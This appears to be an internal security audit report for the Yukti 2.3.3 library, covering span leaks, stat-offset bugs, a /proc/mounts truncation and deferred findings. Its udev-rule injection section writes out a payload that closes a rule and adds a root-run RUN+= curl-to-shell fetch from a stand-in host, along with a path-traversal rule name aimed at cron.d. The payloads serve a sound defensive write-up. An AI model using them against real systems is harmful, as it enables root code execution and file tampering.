# Yukti Security Audit — 2026-08-19

**Scope**: full P(-1) scaffold-hardening pass against Yukti 2.3.3, targeting
the 2.3.4 release.
**Auditor**: internal, multi-agent sweep.
**Target release**: 2.3.4 (post-fix).
**Method**: ten parallel dimension reviews over `src/`, `programs/`, `tests/`
and `fuzz/`, each finding then put to two independent adversarial verifiers
(a *correctness* lens that re-reads the cited code, and a *reachability* lens
that traces from a real entry point). 153 agents, 72 raw findings, 142
verdicts, 44 refuted. Every surviving finding below was then re-verified by
hand against the source before being written up, and every fix landed here was
proven by measurement, not by inspection.

## Summary

| Severity  | Count | Disposition                                     |
|-----------|-------|-------------------------------------------------|
| CRITICAL  | 0     | —                                               |
| HIGH      | 0     | none survived adversarial verification          |
| MEDIUM    | 12    | 5 fixed in 2.3.4, 7 scheduled                   |
| LOW       | 14    | defence-in-depth; scheduled                     |
| Total     | 26    |                                                 |

**No finding survived at HIGH.** Every HIGH-rated raw finding was downgraded or
refuted by the verification pass — most often because the reporter had not
traced reachability, or had mistaken a userspace `mount.cifs` helper option for
a kernel `mount(2)` parameter. That is the pass working as intended and is
worth stating plainly rather than inflating the headline.

The two findings with the broadest independent agreement (flagged by four
separate dimensions each) were the `/proc/mounts` truncation regression and the
SMB credential interpolation. The single most valuable finding — the sakshi
span leak — came from a manual deferral review running alongside the sweep, not
from the sweep itself. See *What the sweep did not catch*.

## Fixed in 2.3.4

### [MED-1] sakshi span stack leaked on 18 error paths; observability dies permanently after 16

- **Files**: `src/optical.cyr` (6), `src/storage.cyr` (10), `src/linux.cyr` (1),
  `src/udev.cyr` (1)
- **Class**: CWE-772 (missing release of resource); observability integrity

`sakshi_span_enter` pushes onto a fixed 16-entry stack behind
`_sk_span_depth`, a module-global that is **never reset**, and silently becomes
a no-op once `_sk_span_depth >= _SK_MAX_SPANS`. So an unbalanced enter is not a
cosmetic log artifact: it permanently burns one of 16 slots for the life of the
process. After 16, **all** structured logging stops, with no diagnostic. Before
that point each leak makes the next `sakshi_span_exit` pop the wrong frame, so
span names and elapsed times are misattributed.

CLAUDE.md lists "sakshi logging on all device operations — structured
observability" as a key constraint, so silent permanent loss of it is a real
defect, not a nicety.

**Measured, not inferred.** A probe calling each span-bearing public function
down its error path and reading `sakshi_span_depth()` between calls:

| call | before | after |
|---|---|---|
| `open_tray(bad dev)` | 0 | **1** |
| `close_tray(bad dev)` | 1 | **2** |
| `read_toc(bad dev)` | 2 | **3** |
| `storage_eject(bad dev)` | 3 | **4** |

Four leaks from four calls, never returning. `udev_monitor_run` is worse and
structural: `enter=1, exit=0`, so the daemon main loop leaks on its **success**
path.

A realistic trigger is unremarkable: 16 failed ejects on a flaky optical drive,
or 16 monitor restarts, and argonaut/aethersafha lose all structured logging
silently for the rest of the process lifetime.

**Fix.** 18 `sakshi_span_exit()` calls added, one before each unbalanced
return. `storage_unmount` was checked and is *not* affected — its exit at
`storage.cyr:638` dominates all four of its returns, which the runtime probe
confirmed. Post-fix the same probe reports depth 0 → 0 for every call.

**Gate.** `test_span_balance_on_error_paths` drives nine error paths and
asserts the depth is unchanged. Verified to fail when it should: reverting a
single `sakshi_span_exit` produces 10 failures.

> A structural alternative exists. `defer { sakshi_span_exit(); }` is supported
> in cyrius 6.5.29 — verified to run on every early-return path including from
> inside a loop — and sakshi's own header comment recommends it. It would make
> this bug class impossible rather than relying on 18 sites staying correct.
> **Not adopted here** because it also changes *what work falls inside the
> measured span*: `storage_unmount` and `network_mount` currently exit their
> span partway through and then do more work, which `defer` would fold into the
> span duration. That is a separate, deliberate change to observability data.
> Scheduled — see *Deferred*.

### [MED-2] `query_permissions` read st_mode/st_uid/st_gid at x86_64-only offsets

- **File**: `src/device.cyr:157`
- **Class**: CWE-188 (reliance on data/memory layout)
- **Agreement**: 3 independent dimensions

```
var mode = load32(&buf + 24);
var uid  = load32(&buf + 28);
var gid  = load32(&buf + 32);
```

24/28/32 is `struct stat` on **x86_64-Linux only**. aarch64-Linux is
`STAT_MODE=16, STAT_UID=24, STAT_GID=28`. So on aarch64 this read **st_uid as
the mode, st_gid as the uid, and padding as the gid** — every permission
decision made from it is wrong. `src/` contained *zero* named `STAT_*`
constants; every stat offset in the tree was a hardcoded literal.

This is the same class as the already-filed `storage.cyr` TOCTOU-guard bug, and
finding a second instance is what turns it from an isolated slip into a pattern
worth fixing structurally.

**Fix.** Both sites now use the stdlib's per-target `STAT_MODE`/`STAT_UID`/
`STAT_GID`/`STAT_BUFSZ`. On x86_64 these resolve to exactly 24/28/32, so the
change is a provable no-op there and a correctness fix on aarch64.

**agnos fallout, caught by the build gate.** agnos's `struct stat` is a
different shape entirely — `{mode@0, nlink@8, size@16, ino@24, blocks@32,
mtime@40}` in 48 bytes, with **no uid or gid field at all** — so `STAT_UID` /
`STAT_GID` do not exist there and the agnos build failed. `query_permissions`
now fails closed on agnos rather than fabricating a 0/0 that a caller would read
as root-owned, matching the `_yk_mount` philosophy in `src/syscalls.cyr`:
*fabricating a plausible answer is the one outcome never acceptable.*

### [MED-3] `storage.cyr` TOCTOU symlink guard could not fire off x86_64

- **File**: `src/storage.cyr:575`

`load32(&stbuf + 24)` for `st_mode`. On aarch64, offset 24 is `st_uid`, so the
guard added for audit MED-2 (2026-04-19) compared a **uid** against `S_IFLNK`
and could never trigger. Fixed with the same named-constant change as MED-2.

### [MED-4] `network_list_mounted` re-introduced the 8 KB `/proc/mounts` truncation

- **File**: `src/network.cyr:234`
- **Agreement**: 4 independent dimensions

```
var readbuf[8192];
var nbytes = file_read_all("/proc/mounts", &readbuf, 8192);
```

This is precisely the defect that audit **MED-3 (2026-04-19)** fixed in
`find_mount_point`, whose comment even says *"/proc/mounts can exceed 8 KB on
container / btrfs / snap-heavy systems — a fixed stack buffer silently
truncated the tail and caused false-negative mount lookups"*. It came back
because that fix was written **inline in one function** instead of being
shared. On a container-heavy host, every network share past the 8 KB cut
vanished from the returned list, so an already-mounted share read as
not-mounted.

**Fix.** Extracted `read_procfs_text(path, cap)` into `storage.cyr` (visible to
`network.cyr` via include order), used by both call sites. It reads in 4 KB
chunks to EOF, bounds total bytes at `PROC_READ_CAP` (1 MB) so a hostile
`/proc` file cannot exhaust memory, and — unlike either previous version —
**reports truncation** via `sakshi_warn` instead of silently returning a short
answer. This is the third instance of the read-a-procfs-file pattern, which is
what makes extracting it a justified refactor under the project's
wait-for-the-third-instance rule rather than a speculative one.

### [MED-5] udev rule name and rule content were both injectable

- **File**: `src/udev_rules.cyr:75` (content), `:132` and `:177` (path)
- **Class**: CWE-22 (path traversal), CWE-74 (injection)
- **Agreement**: 2 independent dimensions each

Two distinct injections, both from a caller-supplied rule:

**Path.** `write_rule` and `remove_rule` concatenate `ur_name(rule)` straight
into `"<rules_dir>/<name>.rules"`. `validate_rule` checked only that the name
was non-empty. A name of `../../../etc/cron.d/evil` escapes `rules_dir`
entirely; `write_rule` then opens it with `577` = `O_WRONLY|O_CREAT|O_TRUNC`,
making it **arbitrary file create-and-truncate**, and `remove_rule` — which
never called `validate_rule` at all — is **arbitrary unlink**.

**Content.** `render_rule` emits `KEY=="VALUE"` by raw concatenation with no
escaping of `"` or newline. A value of

```
x", RUN+="/bin/sh -c 'curl http://evil/x | sh'
```

closes the rule and authors a second, attacker-controlled one. **udev executes
`RUN+=` as root on device events**, so this is root code execution from a
device description.

Both require a caller that feeds untrusted data into a rule — writing udev
rules already implies root — which is why these land at MEDIUM rather than
HIGH. But the library offered no way to do it safely, and a caller has no
reason to expect a rule *name* to be a path.

**Fix.** `_is_safe_rule_name` (strict allowlist `[A-Za-z0-9_-]`, 1..64 bytes)
and `_is_safe_rule_token` (rejects `"`, `\`, DEL, and every control byte —
a udev rule is one line by definition). `validate_rule` applies both to the
name and to every match/action key and value; `remove_rule` gates on the name
directly since it bypasses `validate_rule`. Legitimate syntax such as
`ATTR{idVendor}` still passes, which a test asserts.

**Gate.** 12 assertions across `test_validate_rule_name_traversal` and
`test_validate_rule_token_injection`. Verified: neutering both allowlists
produces 8 failures.

> **Honest limitation.** The two `remove_rule` assertions in that test pass
> either way — with validation disabled, `remove_rule` proceeds to `xunlink` a
> nonexistent path and still returns an error, so the assertion cannot
> distinguish "rejected by validation" from "unlink failed". The name gate is
> genuinely covered by the four `validate_rule` name assertions, which share
> `_is_safe_rule_name`. Recorded rather than papered over — this is exactly the
> vacuous-assertion pattern flagged in LOW-9 below.

## Deferred — scheduled, not fixed in 2.3.4

Held out to keep 2.3.4 reviewable. Each is real and independently re-verified.

### MEDIUM

- **[MED-6] `udev_monitor_run` leaks a freelist block pair and a property
  hashmap per event.** `src/udev.cyr:727`. Every `continue` in the monitor loop
  abandons the `UdevEvent` and its parsed property map. A daemon processing
  device events grows without bound. Same shape as the `DeviceInfo` retention
  below and probably wants the same answer.
- **[MED-7] `DeviceInfo` is retained forever; `device_info_free` is a no-op.**
  `src/device.cyr:69`. **Measured: 256 bytes retained per device, permanently**,
  with `device_info_free()` called on every one — 1,000 refreshes of a
  10-device sidebar retains 2,560,536 bytes, linear and unreclaimed. The
  deferral comment's rationale ("DeviceInfo objects are long-lived … so pooling
  doesn't win here") is true for a single enumeration and false for a daemon,
  and a no-op `free` actively misleads a caller into believing it released
  memory. All three named consumers (argonaut, aethersafha, the file-manager
  sidebar) are long-running refresh loops. Pairs with the existing
  `enumerate_devices_into(pool)` roadmap item, which is filed under 2.5.0 as an
  ergonomics/performance idea and should be re-framed as a retention fix.
- **[MED-8] `device_db_open` overwrites a live handle without closing it.**
  `src/device_db.cyr:122`. A second open leaks the first patra handle; a failed
  re-open zeroes `_yukti_db`, silently disabling every subsequent DB call.
- **[MED-9] `device_db_get_preference` returns `Str`s aliasing patra-owned
  memory.** `src/device_db.cyr:391`. Values point into a patra result that the
  caller then frees, and `str_from()` runs an unbounded `strlen` over a fixed
  256-byte field with no guaranteed NUL.
- **[MED-10] GPT fields are used without range validation.**
  `src/partition.cyr:359` (entry-array byte offset can wrap i64 to 0) and
  `:379` (`end_lba < start_lba` yields a negative size). A hostile disk is
  explicitly in the threat model. `:394` additionally passes a `Str` to
  `str_from()` where a C string is expected.
- **[MED-11] `network_probe_host` maps any non-dotted-quad host to 0.0.0.0.**
  `src/network.cyr:317`. Linux treats 0.0.0.0 as localhost for `connect()`, so
  a hostname probe silently tests the local machine and reports success.
- **[MED-12] `_audio_load_drivers` takes an unbounded card index from
  `/proc/asound/cards`** and uses it as a vec fill count. `src/audio.cyr:255`.

## Refuted — recorded so they are not re-reported

44 of 142 verdicts refuted. The ones most likely to be raised again:

- **SMB `credentials=` arbitrary file read.** `credentials=` is a **mount.cifs
  userspace helper** option; it never appears in the `mount(2)` data string.
  Yukti issues the syscall directly with no helper, so the kernel sees an
  unrecognised parameter and fails the mount. The *permissions* variant
  (`file_mode=`, `dir_mode=`, `noperm`) is the part that holds up, and it is
  recorded as MED-6 territory in `network.cyr` — the credential fields are
  interpolated into the comma-separated mount data with no `,`/`=` rejection.
  Reachability was **not** traced to any real consumer, so it is a library
  hardening gap, not a demonstrated exploit chain.
- **SQL injection via `_sql_escape_str`.** The escape doubles `'` and drops NUL
  and newline; patra's tokenizer was read directly and no other byte terminates
  a string literal. Holds.
- **Kernel-safe invariant broken.** `dist/yukti-core.cyr` has **0** call-shaped
  `alloc(` and **0** syscall references; `core_smoke` passes. The `alloc` in the
  sidecar is comment text only.

## What the sweep did not catch

Worth recording, because it calibrates how much to trust the next one.

The **sakshi span leak — the most consequential finding in this audit — was not
found by the ten-dimension sweep.** It surfaced from a manual review of in-code
deferrals running alongside it, when reading `linux_dm_enumerate` for an
unrelated reason showed an early `return` between an enter and its exit. The
`state-reentrancy` dimension was the one shaped to find it and reported
`udev.cyr:719` at LOW, without the mechanism (the 16-slot saturation) or the
measurement that makes it matter.

Two lessons for the next pass:

1. **Runtime probes beat static reading.** A regex over enter/exit pairs
   produced 10 suspects, of which **3 were false positives** (`storage_unmount`,
   `read_audio_sectors`, `linux_dm_enumerate` on the tested path) and it missed
   3 of `read_toc`'s 4 leaks. Driving the code and reading
   `sakshi_span_depth()` settled it in one run. The same applies to the
   `DeviceInfo` retention, which was quantified with `alloc_used()` rather than
   argued about.
2. **Deferral comments are a finding source in their own right.** Four in-code
   deferrals existed; two were stale in ways that mattered (the retention
   rationale, the mock-sysfs blocker), and one — the agnos `sys_mount` note —
   was verified still accurate rather than assumed. Zero TODO/FIXME/XXX/HACK
   markers exist in the tree, which is unusual and good, but it also means
   deferrals hide in prose and only a deliberate pass finds them.

The completeness critic ran over the surviving set and the clean claims; its
gap list is folded into the Deferred section above.
